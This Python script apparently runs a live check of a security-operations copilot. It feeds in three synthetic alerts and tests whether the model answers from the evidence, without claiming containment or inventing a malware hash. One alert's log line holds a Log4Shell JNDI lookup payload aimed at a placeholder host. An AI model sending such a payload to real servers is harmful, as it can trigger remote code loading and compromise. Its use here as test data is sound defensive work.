"""Manual live Groq system check using isolated synthetic SOC incidents.

Run from the repo root with: uv run python scripts/groq_system_check.py
The local .env must provide TERMINUS_LLM_API_KEY. This is intentionally outside pytest
because it makes live model calls and consumes provider quota.
"""

from __future__ import annotations

import json
import secrets
from datetime import UTC, datetime

from fastapi.testclient import TestClient

from terminus.config import Settings
from terminus.server.app import create_app


def checked(response, label: str):
    if response.status_code >= 400:
        raise AssertionError(f"{label}: HTTP {response.status_code}: {response.text[:500]}")
    return response.json()


def main() -> None:
    settings = Settings()
    if not settings.llm_api_key:
        raise RuntimeError("Set TERMINUS_LLM_API_KEY in ignored .env before running")

    client = TestClient(create_app())
    email = f"groq-check-{secrets.token_hex(5)}@example.test"
    checked(client.post("/auth/register", json={"email": email, "password": "TestingOnlyPass123!", "display_name": "Groq Test Analyst"}), "register")
    login = checked(client.post("/auth/login", json={"email": email, "password": "TestingOnlyPass123!"}), "login")
    auth = {"Authorization": f"Bearer {login['session_token']}"}
    org = checked(client.post("/orgs", headers=auth, json={"name": "Synthetic Groq Test"}), "create org")
    headers = {**auth, "X-Org-ID": org["org_id"]}
    timestamp = datetime.now(UTC).isoformat()

    scenarios = [
        ("ssh-a", 8, "Repeated SSH authentication failures", "T1110", "auth-gw-01", "203.0.113.77", "sshd: 37 failed password attempts for admin from 203.0.113.77; no successful login recorded"),
        ("web-b", 12, "Log4Shell JNDI lookup attempt", "T1190", "web-prod-02", "203.0.113.77", "nginx: 203.0.113.77 GET /search?q=${jndi:ldap://example.invalid/a} HTTP/1.1; blocked by application"),
        ("admin-c", 7, "Scheduled administrator login", "T1078", "ops-jump-01", "198.51.100.5", "sshd: successful login for maintenance-user from 198.51.100.5 during approved change window"),
    ]
    for alert_id, level, description, mitre, host, source, log in scenarios:
        payload = {
            "id": f"groq-{alert_id}-{secrets.token_hex(3)}",
            "rule": {"id": 100100 + level, "level": level, "description": description, "mitre": {"id": mitre}},
            "agent": {"id": host, "name": host},
            "data": {"srcip": source},
            "full_log": log,
            "timestamp": timestamp,
        }
        checked(client.post("/wazuh", headers=headers, json=payload), f"ingest {alert_id}")

    incidents = checked(client.get("/incidents", headers=headers), "list incidents")
    assert len(incidents) == 3, f"Expected 3 incidents, got {len(incidents)}"
    assert all("no known malicious reputation" not in str(item.get("summary") or "").lower() for item in incidents), "An unconfigured reputation provider was treated as a benign result"
    ids = [item["id"] for item in incidents]
    print(json.dumps({"model": settings.llm_model, "incident_ids": ids, "source_ips": [item.get("source_ip") for item in incidents]}, ensure_ascii=True))

    prompts = [
        "Which observed source IP is the strongest potential attacker across multiple hosts? Compare it with the approved administrator source. Cite incident IDs and raw event evidence; do not claim to know the person's identity.",
        "What exact evidence supports the SSH alert on auth-gw-01? Give the observed source IP, failed attempt count, and the incident ID. State whether a successful login was recorded.",
        "Has Terminus executed host isolation or an IP block for these incidents? What proof is present?",
        "What SHA-256 malware hash appears in these incident records? If none is present, say so without inventing one.",
    ]
    observed: list[dict[str, object]] = []
    allowed_tools = {"list_incidents", "search_incidents", "get_incident", "correlate_sources"}
    for index, prompt in enumerate(prompts, 1):
        reply = checked(client.post("/copilot/chat", headers=headers, json={"prompt": prompt}), f"copilot question {index}")
        tools = reply["tools_consulted"]
        answer = reply["response"]
        observed.append({"question": index, "tools": tools, "response": answer})
        print(json.dumps(observed[-1], ensure_ascii=True))

    assert "203.0.113.77" in observed[0]["response"], "Cross-host attacker lead missing"
    assert "198.51.100.5" in observed[0]["response"], "Approved administrator comparison missing"
    assert "203.0.113.77" in observed[1]["response"] and "37" in observed[1]["response"], "SSH evidence missing"
    containment_answer = str(observed[2]["response"]).lower()
    assert "no" in containment_answer and any(term in containment_answer for term in ("contain", "isolat", "block")), "Containment answer lacked evidence-based uncertainty"
    assert "no" in str(observed[3]["response"]).lower() and "sha-256" in str(observed[3]["response"]).lower(), "Missing-hash answer was not explicit"
    for item in observed:
        tools = item["tools"]
        assert tools and set(tools) <= allowed_tools, f"Question {item['question']} did not use the read-only incident tools: {tools}"
    print("PASS: live model used incident tools and answered the evidence scenarios")


if __name__ == "__main__":
    main()
